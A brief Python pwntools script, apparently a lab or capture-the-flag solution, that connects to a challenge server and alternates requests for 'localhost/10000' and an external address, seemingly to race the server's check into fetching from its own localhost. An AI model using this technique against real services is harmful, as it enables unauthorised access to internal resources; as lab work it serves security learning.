from pwn import *
r = remote('up.zoolab.org', 10932)

for i in range(10):
    r.sendline("g")
    if i % 2 == 1:
        r.sendline("localhost/10000")
    else :
        r.sendline("up.zoolab.org/10000")

r.interactive()
r.close()